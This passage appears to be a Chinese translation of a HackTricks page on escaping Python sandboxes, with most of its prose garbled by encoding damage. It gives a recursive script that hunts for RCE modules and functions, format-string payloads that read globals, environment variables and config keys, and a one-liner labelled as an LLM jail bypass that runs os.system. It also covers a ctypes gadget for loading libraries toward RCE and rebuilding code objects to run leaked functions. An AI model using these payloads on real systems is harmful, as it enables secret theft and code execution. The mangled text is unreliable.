AuthorityKeyIdentifier, SubjectKeyIdentifier, AuthorityInformationAccess, SubjectInformationAccess, AccessDescription, BasicConstraints, DeltaCRLIndicator, CRLDistributionPoints, FreshestCRL, DistributionPoint, PolicyConstraints, CertificatePolicies, PolicyInformation, UserNotice, NoticeReference, ExtendedKeyUsage, TLSFeature, InhibitAnyPolicy, KeyUsage, NameConstraints, Extension, GeneralNames, SubjectAlternativeName, IssuerAlternativeName, CertificateIssuer, CRLReason, InvalidityDate, PrecertificateSignedCertificateTimestamps, SignedCertificateTimestamps, OCSPNonce, IssuingDistributionPoint, UnrecognizedExtension, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _OpenSSLError, Binding, _X509NameInvalidator, PKey, _EllipticCurve, X509Name, X509Extension, X509Req, X509, X509Store, X509StoreContext, Revoked, CRL, PKCS12, NetscapeSPKI, _PassphraseHelper, _CallbackExceptionHelper, Context, Connection, _CipherContext, _CMACContext, _X509ExtensionParser, DHPrivateNumbers, DHPublicNumbers, DHParameterNumbers, _DHParameters, _DHPrivateKey, _DHPublicKey, Prehashed, _DSAVerificationContext, _DSASignatureContext, _DSAParameters, _DSAPrivateKey, _DSAPublicKey, _ECDSASignatureContext, _ECDSAVerificationContext, _EllipticCurvePrivateKey, _EllipticCurvePublicKey, _Ed25519PublicKey, _Ed25519PrivateKey, _Ed448PublicKey, _Ed448PrivateKey, _HashContext, _HMACContext, _Certificate, _RevokedCertificate, _CertificateRevocationList, _CertificateSigningRequest, _SignedCertificateTimestamp, OCSPRequestBuilder, _SingleResponse, OCSPResponseBuilder, _OCSPResponse, _OCSPRequest, _Poly1305Context, PSS, OAEP, MGF1, _RSASignatureContext, _RSAVerificationContext, _RSAPrivateKey, _RSAPublicKey, _X25519PublicKey, _X25519PrivateKey, _X448PublicKey, _X448PrivateKey, Scrypt, PKCS7SignatureBuilder, Backend, GetCipherByName, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, RawJSON, JSONDecoder, JSONEncoder, Cookie, CookieJar, MockRequest, MockResponse, Response, BaseAdapter, UnixHTTPConnection, monkeypatch, JSONDecoder, JSONEncoder, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
"""
</code></pre>
<h2 id="é€’å½’æœç´¢å†…ç½®å¯¹è±¡å…¨å±€å˜é‡"><a class="header" href="#é€’å½’æœç´¢å†…ç½®å¯¹è±¡å…¨å±€å˜é‡">é€’å½’æœç´¢å†…ç½®å¯¹è±¡ã€å…¨å±€å˜é‡...</a></h2>
<p>{% hint style="warning" %}
è¿™çœŸæ˜¯<strong>å¤ªæ£’äº†</strong>ã€‚å¦‚æœä½ <strong>æ­£åœ¨å¯»æ‰¾åƒ globalsã€builtinsã€open æˆ–å…¶ä»–ä»»ä½•å¯¹è±¡</strong>ï¼Œåªéœ€ä½¿ç”¨è¿™ä¸ªè„šæœ¬æ¥<strong>é€’å½’æŸ¥æ‰¾å¯ä»¥æ‰¾åˆ°è¯¥å¯¹è±¡çš„åœ°æ–¹ã€‚</strong>
{% endhint %}</p>
<pre><code class="language-python">import os, sys # Import these to find more gadgets

SEARCH_FOR = {
# Misc
"__globals__": set(),
"builtins": set(),
"__builtins__": set(),
"open": set(),

# RCE libs
"os": set(),
"subprocess": set(),
"commands": set(),
"pty": set(),
"importlib": set(),
"imp": set(),
"sys": set(),
"pip": set(),
"pdb": set(),

# RCE methods
"system": set(),
"popen": set(),
"getstatusoutput": set(),
"getoutput": set(),
"call": set(),
"Popen": set(),
"popen": set(),
"spawn": set(),
"import_module": set(),
"__import__": set(),
"load_source": set(),
"execfile": set(),
"execute": set()
}

#More than 4 is very time consuming
MAX_CONT = 4

#The ALREADY_CHECKED makes the script run much faster, but some solutions won't be found
#ALREADY_CHECKED = set()

def check_recursive(element, cont, name, orig_n, orig_i, execute):
# If bigger than maximum, stop
if cont &gt; MAX_CONT:
return

# If already checked, stop
#if name and name in ALREADY_CHECKED:
#    return

# Add to already checked
#if name:
#    ALREADY_CHECKED.add(name)

# If found add to the dict
for k in SEARCH_FOR:
if k in dir(element) or (type(element) is dict and k in element):
SEARCH_FOR[k].add(f"{orig_i}: {orig_n}.{name}")

# Continue with the recursivity
for new_element in dir(element):
try:
check_recursive(getattr(element, new_element), cont+1, f"{name}.{new_element}", orig_n, orig_i, execute)

# WARNING: Calling random functions sometimes kills the script
# Comment this part if you notice that behaviour!!
if execute:
try:
if callable(getattr(element, new_element)):
check_recursive(getattr(element, new_element)(), cont+1, f"{name}.{new_element}()", orig_i, execute)
except:
pass

except:
pass

# If in a dict, scan also each key, very important
if type(element) is dict:
for new_element in element:
check_recursive(element[new_element], cont+1, f"{name}[{new_element}]", orig_n, orig_i)


def main():
print("Checking from empty string...")
total = [""]
for i,element in enumerate(total):
print(f"\rStatus: {i}/{len(total)}", end="")
cont = 1
check_recursive(element, cont, "", str(element), f"Empty str {i}", True)

print()
print("Checking loaded subclasses...")
total = "".__class__.__base__.__subclasses__()
for i,element in enumerate(total):
print(f"\rStatus: {i}/{len(total)}", end="")
cont = 1
check_recursive(element, cont, "", str(element), f"Subclass {i}", True)

print()
print("Checking from global functions...")
total = [print, check_recursive]
for i,element in enumerate(total):
print(f"\rStatus: {i}/{len(total)}", end="")
cont = 1
check_recursive(element, cont, "", str(element), f"Global func {i}", False)

print()
print(SEARCH_FOR)


if __name__ == "__main__":
main()
</code></pre>
<p>æ‚¨å¯ä»¥åœ¨æ­¤é¡µé¢ä¸Šæ£€æŸ¥æ­¤è„šæœ¬çš„è¾“å‡ºï¼š</p>
<p>{% content-ref url="https://github.com/carlospolop/hacktricks/blob/master/generic-methodologies-and-resources/python/bypass-python-sandboxes/broken-reference/README.md" %}
<a href="https://github.com/carlospolop/hacktricks/blob/master/generic-methodologies-and-resources/python/bypass-python-sandboxes/broken-reference/README.md">https://github.com/carlospolop/hacktricks/blob/master/generic-methodologies-and-resources/python/bypass-python-sandboxes/broken-reference/README.md</a>
{% endcontent-ref %}</p>
<h2 id="python-æ ¼å¼å­—ç¬¦ä¸²"><a class="header" href="#python-æ ¼å¼å­—ç¬¦ä¸²">Python æ ¼å¼å­—ç¬¦ä¸²</a></h2>
<p>å¦‚æœæ‚¨<strong>å‘é€</strong>ä¸€ä¸ªå°†è¦<strong>æ ¼å¼åŒ–</strong>çš„<strong>å­—ç¬¦ä¸²</strong>ç»™pythonï¼Œæ‚¨å¯ä»¥ä½¿ç”¨<code>{}</code>æ¥è®¿é—®<strong>pythonå†…éƒ¨ä¿¡æ¯ã€‚</strong> æ‚¨å¯ä»¥ä½¿ç”¨ä¹‹å‰çš„ç¤ºä¾‹æ¥è®¿é—®å…¨å±€å˜é‡æˆ–å†…ç½®å‡½æ•°ï¼Œä¾‹å¦‚ã€‚</p>
<pre><code class="language-python"># Example from https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/
CONFIG = {
"KEY": "ASXFYFGK78989"
}

class PeopleInfo:
def __init__(self, fname, lname):
self.fname = fname
self.lname = lname

def get_name_for_avatar(avatar_str, people_obj):
return avatar_str.format(people_obj = people_obj)

people = PeopleInfo('GEEKS', 'FORGEEKS')

st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
get_name_for_avatar(st, people_obj = people)
</code></pre>
<p>æ³¨æ„ä½ å¯ä»¥é€šè¿‡ <strong>ç‚¹</strong> çš„æ–¹å¼æ­£å¸¸ <strong>è®¿é—®å±æ€§</strong>ï¼Œä¾‹å¦‚ <code>people_obj.__init__</code>ï¼Œè€Œ <strong>å­—å…¸å…ƒç´ </strong> åˆ™å¯ä»¥ç”¨ <strong>æ‹¬å·</strong> è®¿é—®ï¼Œä¸éœ€è¦å¼•å· <code>__globals__[CONFIG]</code>ã€‚</p>
<p>è¿˜è¦æ³¨æ„ï¼Œä½ å¯ä»¥ä½¿ç”¨ <code>.__dict__</code> æ¥æšä¸¾å¯¹è±¡çš„å…ƒç´  <code>get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)</code>ã€‚</p>
<p>æ ¼å¼å­—ç¬¦ä¸²çš„å…¶ä»–ä¸€äº›æœ‰è¶£ç‰¹æ€§æ˜¯å¯ä»¥é€šè¿‡æ·»åŠ  <strong><code>!s</code></strong>ã€<strong><code>!r</code></strong> å’Œ <strong><code>!a</code></strong> åˆ†åˆ«åœ¨æŒ‡å®šå¯¹è±¡ä¸­ <strong>æ‰§è¡Œ</strong> <strong><code>str</code></strong>ã€<strong><code>repr</code></strong> å’Œ <strong><code>ascii</code></strong> å‡½æ•°ï¼š</p>
<pre><code class="language-python">st = "{people_obj.__init__.__globals__[CONFIG][KEY]!a}"
get_name_for_avatar(st, people_obj = people)
</code></pre>
<p>æ­¤å¤–ï¼Œå¯ä»¥åœ¨ç±»ä¸­<strong>ç¼–å†™æ–°çš„æ ¼å¼åŒ–ç¨‹åº</strong>ï¼š</p>
<pre><code class="language-python">class HAL9000(object):
def __format__(self, format):
if (format == 'open-the-pod-bay-doors'):
return "I'm afraid I can't do that."
return 'HAL 9000'

'{:open-the-pod-bay-doors}'.format(HAL9000())
#I'm afraid I can't do that.
</code></pre>
<p><strong>æ›´å¤šç¤ºä¾‹</strong> å…³äº <strong>æ ¼å¼</strong> <strong>å­—ç¬¦ä¸²</strong> ç¤ºä¾‹å¯ä»¥åœ¨ <a href="https://pyformat.info"><strong>https://pyformat.info/</strong></a> æ‰¾åˆ°</p>
<p>{% hint style="danger" %}
è¿˜è¯·æŸ¥çœ‹ä»¥ä¸‹é¡µé¢ï¼Œäº†è§£å°†ä» Python å†…éƒ¨å¯¹è±¡ä¸­è¯»å–æ•æ„Ÿä¿¡æ¯çš„å·¥å…·ï¼š
{% endhint %}</p>
<p>{% content-ref url="../python-internal-read-gadgets.md" %}
<a href="../python-internal-read-gadgets.html">python-internal-read-gadgets.md</a>
{% endcontent-ref %}</p>
<h3 id="æ•æ„Ÿä¿¡æ¯æ³„éœ²æœ‰æ•ˆè½½è·"><a class="header" href="#æ•æ„Ÿä¿¡æ¯æ³„éœ²æœ‰æ•ˆè½½è·">æ•æ„Ÿä¿¡æ¯æ³„éœ²æœ‰æ•ˆè½½è·</a></h3>
<pre><code class="language-python">{whoami.__class__.__dict__}
{whoami.__globals__[os].__dict__}
{whoami.__globals__[os].environ}
{whoami.__globals__[sys].path}
{whoami.__globals__[sys].modules}

# Access an element through several links
{whoami.__globals__[server].__dict__[bridge].__dict__[db].__dict__}

# Example from https://corgi.rip/posts/buckeye-writeups/
secret_variable = "clueless"
x = new_user.User(username='{i.find.__globals__[so].mapperlib.sys.modules[__main__].secret_variable}',password='lol')
str(x) # Out: clueless
</code></pre>
<h3 id="llm-jails-bypass"><a class="header" href="#llm-jails-bypass">LLM Jails bypass</a></h3>
<p>æ¥è‡ª <a href="https://www.cyberark.com/resources/threat-research-blog/anatomy-of-an-llm-rce">è¿™é‡Œ</a>: <code>().class.base.subclasses()[108].load_module('os').system('dir')</code></p>
<h3 id="ä»æ ¼å¼åˆ°-rce-åŠ è½½åº“"><a class="header" href="#ä»æ ¼å¼åˆ°-rce-åŠ è½½åº“">ä»æ ¼å¼åˆ° RCE åŠ è½½åº“</a></h3>
<p>æ ¹æ® <a href="https://corgi.rip/posts/buckeye-writeups/"><strong>TypeMonkey chall from this writeup</strong></a>ï¼Œå¯ä»¥é€šè¿‡åˆ©ç”¨ Python ä¸­çš„æ ¼å¼å­—ç¬¦ä¸²æ¼æ´ä»ç£ç›˜åŠ è½½ä»»æ„åº“ã€‚</p>
<p>ä½œä¸ºæé†’ï¼Œæ¯å½“åœ¨ Python ä¸­æ‰§è¡ŒæŸä¸ªæ“ä½œæ—¶ï¼Œéƒ½ä¼šæ‰§è¡ŒæŸä¸ªå‡½æ•°ã€‚ä¾‹å¦‚ <code>2*3</code> å°†æ‰§è¡Œ <strong><code>(2).mul(3)</code></strong> æˆ– <strong><code>{'a':'b'}['a']</code></strong> å°†æ˜¯ <strong><code>{'a':'b'}.__getitem__('a')</code></strong>ã€‚</p>
<p>åœ¨ <a href="./#python-execution-without-calls"><strong>Python execution without calls</strong></a> éƒ¨åˆ†ä¸­è¿˜æœ‰æ›´å¤šç±»ä¼¼çš„å†…å®¹ã€‚</p>
<p>Python æ ¼å¼å­—ç¬¦ä¸²æ¼æ´ä¸å…è®¸æ‰§è¡Œå‡½æ•°ï¼ˆä¸å…è®¸ä½¿ç”¨æ‹¬å·ï¼‰ï¼Œå› æ­¤æ— æ³•åƒ <code>'{0.system("/bin/sh")}'.format(os)</code> é‚£æ ·è·å¾— RCEã€‚<br />
ç„¶è€Œï¼Œå¯ä»¥ä½¿ç”¨ <code>[]</code>ã€‚å› æ­¤ï¼Œå¦‚æœä¸€ä¸ªå¸¸è§çš„ Python åº“å…·æœ‰ <strong><code>__getitem__</code></strong> æˆ– <strong><code>__getattr__</code></strong> æ–¹æ³•æ¥æ‰§è¡Œä»»æ„ä»£ç ï¼Œåˆ™å¯ä»¥åˆ©ç”¨å®ƒä»¬æ¥è·å¾— RCEã€‚</p>
<p>åœ¨ Python ä¸­å¯»æ‰¾è¿™æ ·çš„ gadgetï¼Œå†™ä½œæä¾›äº†è¿™ä¸ª <a href="https://github.com/search?q=repo%3Apython%2Fcpython+%2Fdef+%28__getitem__%7C__getattr__%29%2F+path%3ALib%2F+-path%3ALib%2Ftest%2F&amp;type=code"><strong>Github æœç´¢æŸ¥è¯¢</strong></a>ã€‚ä»–åœ¨è¿™é‡Œæ‰¾åˆ°äº†è¿™ä¸ª <a href="https://github.com/python/cpython/blob/43303e362e3a7e2d96747d881021a14c7f7e3d0b/Lib/ctypes/__init__.py#L463">one</a>:</p>
<pre><code class="language-python">class LibraryLoader(object):
def __init__(self, dlltype):
self._dlltype = dlltype

def __getattr__(self, name):
if name[0] == '_':
raise AttributeError(name)
try:
dll = self._dlltype(name)
except OSError:
raise AttributeError(name)
setattr(self, name, dll)
return dll

def __getitem__(self, name):
return getattr(self, name)

cdll = LibraryLoader(CDLL)
pydll = LibraryLoader(PyDLL)
</code></pre>
<p>è¿™ä¸ªå·¥å…·å…è®¸<strong>ä»ç£ç›˜åŠ è½½åº“</strong>ã€‚å› æ­¤ï¼Œéœ€è¦ä»¥æŸç§æ–¹å¼<strong>å†™å…¥æˆ–ä¸Šä¼ è¦åŠ è½½çš„åº“</strong>ï¼Œä»¥æ­£ç¡®ç¼–è¯‘åˆ°è¢«æ”»å‡»çš„æœåŠ¡å™¨ã€‚</p>
<pre><code class="language-python">'{i.find.__globals__[so].mapperlib.sys.modules[ctypes].cdll[/path/to/file]}'
</code></pre>
<p>æŒ‘æˆ˜å®é™…ä¸Šåˆ©ç”¨äº†æœåŠ¡å™¨ä¸­çš„å¦ä¸€ä¸ªæ¼æ´ï¼Œè¯¥æ¼æ´å…è®¸åœ¨æœåŠ¡å™¨ç£ç›˜ä¸Šåˆ›å»ºä»»æ„æ–‡ä»¶ã€‚</p>
<h2 id="è§£å‰–-python-å¯¹è±¡"><a class="header" href="#è§£å‰–-python-å¯¹è±¡">è§£å‰– Python å¯¹è±¡</a></h2>
<p>{% hint style="info" %}
å¦‚æœä½ æƒ³æ·±å…¥äº†è§£ <strong>python å­—èŠ‚ç </strong>ï¼Œè¯·é˜…è¯»è¿™ç¯‡å…³äºè¯¥ä¸»é¢˜çš„ <strong>ç²¾å½©</strong> æ–‡ç« ï¼š<a href="https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d"><strong>https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d</strong></a>
{% endhint %}</p>
<p>åœ¨ä¸€äº› CTF ä¸­ï¼Œä½ å¯èƒ½ä¼šè¢«æä¾›ä¸€ä¸ª <strong>è‡ªå®šä¹‰å‡½æ•°çš„åç§°ï¼Œå…¶ä¸­åŒ…å«æ ‡å¿—</strong>ï¼Œä½ éœ€è¦æŸ¥çœ‹ <strong>å‡½æ•°</strong> çš„ <strong>å†…éƒ¨</strong> ä»¥æå–å®ƒã€‚</p>
<p>è¿™æ˜¯è¦æ£€æŸ¥çš„å‡½æ•°ï¼š</p>
<pre><code class="language-python">def get_flag(some_input):
var1=1
var2="secretcode"
var3=["some","array"]
if some_input == var2:
return "THIS-IS-THE-FALG!"
else:
return "Nope"
</code></pre>
<h4 id="dir"><a class="header" href="#dir">dir</a></h4>
<pre><code class="language-python">dir() #General dir() to find what we have loaded
['__builtins__', '__doc__', '__name__', '__package__', 'b', 'bytecode', 'code', 'codeobj', 'consts', 'dis', 'filename', 'foo', 'get_flag', 'names', 'read', 'x']
dir(get_flag) #Get info tof the function
['__call__', '__class__', '__closure__', '__code__', '__defaults__', '__delattr__', '__dict__', '__doc__', '__format__', '__get__', '__getattribute__', '__globals__', '__hash__', '__init__', '__module__', '__name__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'func_closure', 'func_code', 'func_defaults', 'func_dict', 'func_doc', 'func_globals', 'func_name']
</code></pre>
<h4 id="globals"><a class="header" href="#globals">globals</a></h4>
<p><code>__globals__</code> å’Œ <code>func_globals</code>ï¼ˆç›¸åŒï¼‰è·å–å…¨å±€ç¯å¢ƒã€‚åœ¨ç¤ºä¾‹ä¸­ï¼Œæ‚¨å¯ä»¥çœ‹åˆ°ä¸€äº›å¯¼å…¥çš„æ¨¡å—ã€ä¸€äº›å…¨å±€å˜é‡åŠå…¶å£°æ˜çš„å†…å®¹ï¼š</p>
<pre><code class="language-python">get_flag.func_globals
get_flag.__globals__
{'b': 3, 'names': ('open', 'read'), '__builtins__': &lt;module '__builtin__' (built-in)&gt;, 'codeobj': &lt;code object &lt;module&gt; at 0x7f58c00b26b0, file "noname", line 1&gt;, 'get_flag': &lt;function get_flag at 0x7f58c00b27d0&gt;, 'filename': './poc.py', '__package__': None, 'read': &lt;function read at 0x7f58c00b23d0&gt;, 'code': &lt;type 'code'&gt;, 'bytecode': 't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S', 'consts': (None, './poc.py', 'r'), 'x': &lt;unbound method catch_warnings.__init__&gt;, '__name__': '__main__', 'foo': &lt;function foo at 0x7f58c020eb50&gt;, '__doc__': None, 'dis': &lt;module 'dis' from '/usr/lib/python2.7/dis.pyc'&gt;}

#If you have access to some variable value
CustomClassObject.__class__.__init__.__globals__
</code></pre>
<p><a href="./#globals-and-locals"><strong>æŸ¥çœ‹æ›´å¤šè·å– globals çš„åœ°æ–¹</strong></a></p>
<h3 id="è®¿é—®å‡½æ•°ä»£ç "><a class="header" href="#è®¿é—®å‡½æ•°ä»£ç "><strong>è®¿é—®å‡½æ•°ä»£ç </strong></a></h3>
<p><strong><code>__code__</code></strong> å’Œ <code>func_code</code>ï¼šæ‚¨å¯ä»¥ <strong>è®¿é—®</strong> è¿™ä¸ª <strong>å±æ€§</strong> æ¥ <strong>è·å–å‡½æ•°çš„ä»£ç å¯¹è±¡</strong>ã€‚</p>
<pre><code class="language-python"># In our current example
get_flag.__code__
&lt;code object get_flag at 0x7f9ca0133270, file "&lt;stdin&gt;", line 1

# Compiling some python code
compile("print(5)", "", "single")
&lt;code object &lt;module&gt; at 0x7f9ca01330c0, file "", line 1&gt;

#Get the attributes of the code object
dir(get_flag.__code__)
['__class__', '__cmp__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'co_argcount', 'co_cellvars', 'co_code', 'co_consts', 'co_filename', 'co_firstlineno', 'co_flags', 'co_freevars', 'co_lnotab', 'co_name', 'co_names', 'co_nlocals', 'co_stacksize', 'co_varnames']
</code></pre>
<h3 id="è·å–ä»£ç ä¿¡æ¯"><a class="header" href="#è·å–ä»£ç ä¿¡æ¯">è·å–ä»£ç ä¿¡æ¯</a></h3>
<pre><code class="language-python"># Another example
s = '''
a = 5
b = 'text'
def f(x):
return x
f(5)
'''
c=compile(s, "", "exec")

# __doc__: Get the description of the function, if any
print.__doc__

# co_consts: Constants
get_flag.__code__.co_consts
(None, 1, 'secretcode', 'some', 'array', 'THIS-IS-THE-FALG!', 'Nope')

c.co_consts #Remember that the exec mode in compile() generates a bytecode that finally returns None.
(5, 'text', &lt;code object f at 0x7f9ca0133540, file "", line 4&gt;, 'f', None

# co_names: Names used by the bytecode which can be global variables, functions, and classes or also attributes loaded from objects.
get_flag.__code__.co_names
()

c.co_names
('a', 'b', 'f')


#co_varnames: Local names used by the bytecode (arguments first, then the local variables)
get_flag.__code__.co_varnames
('some_input', 'var1', 'var2', 'var3')

#co_cellvars: Nonlocal variables These are the local variables of a function accessed by its inner functions.
get_flag.__code__.co_cellvars
()

#co_freevars: Free variables are the local variables of an outer function which are accessed by its inner function.
get_flag.__code__.co_freevars
()

#Get bytecode
get_flag.__code__.co_code
'd\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S'
</code></pre>
<h3 id="åæ±‡ç¼–ä¸€ä¸ªå‡½æ•°"><a class="header" href="#åæ±‡ç¼–ä¸€ä¸ªå‡½æ•°"><strong>åæ±‡ç¼–ä¸€ä¸ªå‡½æ•°</strong></a></h3>
<pre><code class="language-python">import dis
dis.dis(get_flag)
2           0 LOAD_CONST               1 (1)
3 STORE_FAST               1 (var1)

3           6 LOAD_CONST               2 ('secretcode')
9 STORE_FAST               2 (var2)

4          12 LOAD_CONST               3 ('some')
15 LOAD_CONST               4 ('array')
18 BUILD_LIST               2
21 STORE_FAST               3 (var3)

5          24 LOAD_FAST                0 (some_input)
27 LOAD_FAST                2 (var2)
30 COMPARE_OP               2 (==)
33 POP_JUMP_IF_FALSE       40

6          36 LOAD_CONST               5 ('THIS-IS-THE-FLAG!')
39 RETURN_VALUE

8     &gt;&gt;   40 LOAD_CONST               6 ('Nope')
43 RETURN_VALUE
44 LOAD_CONST               0 (None)
47 RETURN_VALUE
</code></pre>
<p>æ³¨æ„ï¼Œå¦‚æœ<strong>æ‚¨æ— æ³•åœ¨pythonæ²™ç®±ä¸­å¯¼å…¥<code>dis</code></strong>ï¼Œæ‚¨å¯ä»¥è·å–å‡½æ•°çš„<strong>å­—èŠ‚ç </strong>ï¼ˆ<code>get_flag.func_code.co_code</code>ï¼‰å¹¶åœ¨æœ¬åœ°<strong>åæ±‡ç¼–</strong>å®ƒã€‚æ‚¨å°†çœ‹ä¸åˆ°æ­£åœ¨åŠ è½½çš„å˜é‡çš„å†…å®¹ï¼ˆ<code>LOAD_CONST</code>ï¼‰ï¼Œä½†æ‚¨å¯ä»¥ä»ï¼ˆ<code>get_flag.func_code.co_consts</code>ï¼‰ä¸­æ¨æµ‹å®ƒä»¬ï¼Œå› ä¸º<code>LOAD_CONST</code>ä¹Ÿä¼šå‘Šè¯‰æ­£åœ¨åŠ è½½çš„å˜é‡çš„åç§»é‡ã€‚</p>
<pre><code class="language-python">dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
0 LOAD_CONST          1 (1)
3 STORE_FAST          1 (1)
6 LOAD_CONST          2 (2)
9 STORE_FAST          2 (2)
12 LOAD_CONST          3 (3)
15 LOAD_CONST          4 (4)
18 BUILD_LIST          2
21 STORE_FAST          3 (3)
24 LOAD_FAST           0 (0)
27 LOAD_FAST           2 (2)
30 COMPARE_OP          2 (==)
33 POP_JUMP_IF_FALSE    40
36 LOAD_CONST          5 (5)
39 RETURN_VALUE
&gt;&gt;   40 LOAD_CONST          6 (6)
43 RETURN_VALUE
44 LOAD_CONST          0 (0)
47 RETURN_VALUE
</code></pre>
<h2 id="ç¼–è¯‘-python"><a class="header" href="#ç¼–è¯‘-python">ç¼–è¯‘ Python</a></h2>
<p>ç°åœ¨ï¼Œè®©æˆ‘ä»¬æƒ³è±¡ä¸€ä¸‹ï¼Œæ‚¨å¯ä»¥ä»¥æŸç§æ–¹å¼<strong>è½¬å‚¨æ‚¨æ— æ³•æ‰§è¡Œçš„å‡½æ•°çš„ä¿¡æ¯</strong>ï¼Œä½†æ‚¨<strong>éœ€è¦</strong>å»<strong>æ‰§è¡Œ</strong>å®ƒã€‚<br />
å°±åƒåœ¨ä»¥ä¸‹ç¤ºä¾‹ä¸­ï¼Œæ‚¨<strong>å¯ä»¥è®¿é—®è¯¥å‡½æ•°çš„ä»£ç å¯¹è±¡</strong>ï¼Œä½†ä»…ä»…é€šè¿‡è¯»å–åæ±‡ç¼–ï¼Œæ‚¨<strong>ä¸çŸ¥é“å¦‚ä½•è®¡ç®—æ ‡å¿—</strong>ï¼ˆ<em>æƒ³è±¡ä¸€ä¸ªæ›´å¤æ‚çš„ <code>calc_flag</code> å‡½æ•°</em>ï¼‰</p>
<pre><code class="language-python">def get_flag(some_input):
var1=1
var2="secretcode"
var3=["some","array"]
def calc_flag(flag_rot2):
return ''.join(chr(ord(c)-2) for c in flag_rot2)
if some_input == var2:
return calc_flag("VjkuKuVjgHnci")
else:
return "Nope"
</code></pre>
<h3 id="åˆ›å»ºä»£ç å¯¹è±¡"><a class="header" href="#åˆ›å»ºä»£ç å¯¹è±¡">åˆ›å»ºä»£ç å¯¹è±¡</a></h3>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦çŸ¥é“ <strong>å¦‚ä½•åˆ›å»ºå’Œæ‰§è¡Œä»£ç å¯¹è±¡</strong>ï¼Œä»¥ä¾¿æˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªæ¥æ‰§è¡Œæˆ‘ä»¬æ³„éœ²çš„å‡½æ•°ï¼š</p>
<pre><code class="language-python">code_type = type((lambda: None).__code__)
# Check the following hint if you get an error in calling this
code_obj = code_type(co_argcount, co_kwonlyargcount,
co_nlocals, co_stacksize, co_flags,
co_code, co_consts, co_names,
co_varnames, co_filename, co_name,
co_firstlineno, co_lnotab, freevars=None,
cellvars=None)

# Execution
eval(code_obj) #Execute as a whole script

# If you have the code of a function, execute it
mydict = {}
mydict['__builtins__'] = __builtins__
function_type(code_obj, mydict, None, None, None)("secretcode")
</code></pre>
<p>{% hint style="info" %}
æ ¹æ® Python ç‰ˆæœ¬ï¼Œ<code>code_type</code> çš„ <strong>å‚æ•°</strong> å¯èƒ½æœ‰ <strong>ä¸åŒçš„é¡ºåº</strong>ã€‚äº†è§£æ‚¨æ­£åœ¨è¿è¡Œçš„ Python ç‰ˆæœ¬ä¸­å‚æ•°çš„é¡ºåºçš„æœ€ä½³æ–¹æ³•æ˜¯è¿è¡Œï¼š</p>
<pre><code>import types
types.CodeType.__doc__
'code(argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize,\n      flags, codestring, constants, names, varnames, filename, name,\n      firstlineno, lnotab[, freevars[, cellvars]])\n\nCreate a code object.  Not for the faint of heart.'
</code></pre>
<p>{% endhint %}</p>
<h3 id="é‡å»ºæ³„éœ²çš„å‡½æ•°"><a class="header" href="#é‡å»ºæ³„éœ²çš„å‡½æ•°">é‡å»ºæ³„éœ²çš„å‡½æ•°</a></h3>
<p>{% hint style="warning" %}
åœ¨ä»¥ä¸‹ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬å°†ç›´æ¥ä»å‡½æ•°ä»£ç å¯¹è±¡è·å–é‡å»ºå‡½æ•°æ‰€éœ€çš„æ‰€æœ‰æ•°æ®ã€‚åœ¨ä¸€ä¸ª<strong>çœŸå®çš„ä¾‹å­</strong>ä¸­ï¼Œæ‰§è¡Œå‡½æ•°**<code>code_type</code><strong>æ‰€éœ€çš„æ‰€æœ‰</strong>å€¼<strong>å°±æ˜¯</strong>ä½ éœ€è¦æ³„éœ²çš„**å†…å®¹ã€‚
{% endhint %}</p>
<pre><code class="language-python">fc = get_flag.__code__
# In a real situation the values like fc.co_argcount are the ones you need to leak
code_obj = code_type(fc.co_argcount, fc.co_kwonlyargcount, fc.co_nlocals, fc.co_stacksize, fc.co_flags, fc.co_code, fc.co_consts, fc.co_names, fc.co_varnames, fc.co_filename, fc.co_name, fc.co_firstlineno, fc.co_lnotab, cellvars=fc.co_cellvars, freevars=fc.co_freevars)

mydict = {}
mydict['__builtins__'] = __builtins__
function_type(code_obj, mydict, None, None, None)("secretcode")
#ThisIsTheFlag
</code></pre>
<h3 id="bypass-defenses"><a class="header" href="#bypass-defenses">Bypass Defenses</a></h3>
<p>åœ¨æœ¬æ–‡å¼€å¤´çš„å‰å‡ ä¸ªç¤ºä¾‹ä¸­ï¼Œæ‚¨å¯ä»¥çœ‹åˆ°<strong>å¦‚ä½•ä½¿ç”¨ <code>compile</code> å‡½æ•°æ‰§è¡Œä»»ä½• python ä»£ç </strong>ã€‚è¿™å¾ˆæœ‰è¶£ï¼Œå› ä¸ºæ‚¨å¯ä»¥<strong>åœ¨ä¸€è¡Œä¸­æ‰§è¡Œæ•´ä¸ªè„šæœ¬</strong>ï¼ŒåŒ…æ‹¬å¾ªç¯å’Œæ‰€æœ‰å†…å®¹ï¼ˆæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨**<code>exec</code><strong>åšåˆ°è¿™ä¸€ç‚¹ï¼‰ã€‚<br />
